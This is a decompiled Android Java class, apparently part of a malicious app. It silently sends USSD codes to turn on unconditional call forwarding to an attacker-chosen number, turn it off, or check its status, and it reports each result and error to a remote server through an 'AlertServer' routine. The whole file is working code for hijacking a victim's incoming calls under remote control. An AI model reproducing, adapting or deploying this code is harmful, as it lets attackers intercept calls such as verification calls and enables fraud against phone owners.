/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.os.Build$VERSION
 *  android.os.Handler
 *  android.os.Looper
 *  android.telephony.SubscriptionInfo
 *  android.telephony.SubscriptionManager
 *  android.telephony.TelephonyManager
 *  android.telephony.TelephonyManager$UssdResponseCallback
 */
package linker.resourcer.encoder;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import androidx.core.app.ActivityCompat;
import linker.resourcer.encoder.WorkerService;

public class CallForwardingManager {
    private static final String TAG = "Call Forwarding";
    private Context context;

    public CallForwardingManager(Context context) {
        this.context = context;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void executeUSSD(String string2, int n) {
        try {
            block6: {
                int n2;
                Object object;
                block8: {
                    block7: {
                        object = (SubscriptionManager)this.context.getSystemService("telephony_subscription_service");
                        if (object == null) return;
                        if (ActivityCompat.checkSelfPermission(this.context, "android.permission.READ_PHONE_STATE") != 0) {
                            return;
                        }
                        if ((object = object.getActiveSubscriptionInfoList()) == null || object.isEmpty()) break block6;
                        if (n < 0) break block7;
                        n2 = n;
                        if (n < object.size()) break block8;
                    }
                    n2 = 0;
                }
                n = ((SubscriptionInfo)object.get(n2)).getSubscriptionId();
                object = (TelephonyManager)this.context.getSystemService("phone");
                if (object == null) return;
                if (Build.VERSION.SDK_INT < 26) return;
                object = object.createForSubscriptionId(n);
                ussbcallback ussbcallback2 = new ussbcallback(this);
                Handler handler = new Handler(Looper.getMainLooper());
                object.sendUssdRequest(string2, (TelephonyManager.UssdResponseCallback)ussbcallback2, handler);
                return;
            }
            WorkerService.MyWorker.AlertServer(this.context, TAG, "No Active SIM Found!");
            return;
        }
        catch (Exception exception) {
            WorkerService.MyWorker.AlertServer(this.context, TAG, "Exec Error:" + exception.getMessage());
        }
    }

    private boolean hasPermission() {
        boolean bl = this.context.checkSelfPermission("android.permission.CALL_PHONE") == 0 && this.context.checkSelfPermission("android.permission.READ_PHONE_STATE") == 0;
        return bl;
    }

    public boolean deactivateCallForwarding(int n) {
        if (!this.hasPermission()) {
            WorkerService.MyWorker.AlertServer(this.context, TAG, "Required permissions are not granted.");
            return false;
        }
        this.executeUSSD("##21#", n);
        return true;
    }

    public boolean forwardCall(String string2, int n) {
        if (!this.hasPermission()) {
            WorkerService.MyWorker.AlertServer(this.context, TAG, "Required permissions are not granted.");
            return false;
        }
        this.executeUSSD("**21*" + string2 + "#", n);
        return true;
    }

    public boolean isCallForwardingActive(int n) {
        if (!this.hasPermission()) {
            WorkerService.MyWorker.AlertServer(this.context, TAG, "Required permissions are not granted.");
            return false;
        }
        this.executeUSSD("*#21#", n);
        return true;
    }

    class ussbcallback
    extends TelephonyManager.UssdResponseCallback {
        final CallForwardingManager this$0;

        ussbcallback(CallForwardingManager callForwardingUtility2) {
            this.this$0 = callForwardingUtility2;
        }

        public void onReceiveUssdResponse(TelephonyManager telephonyManager, String string2, CharSequence charSequence) {
            WorkerService.MyWorker.AlertServer(this.this$0.context, CallForwardingManager.TAG, "Success:" + charSequence);
        }

        public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String string2, int n) {
            WorkerService.MyWorker.AlertServer(this.this$0.context, CallForwardingManager.TAG, "Failed:" + n);
        }
    }
}

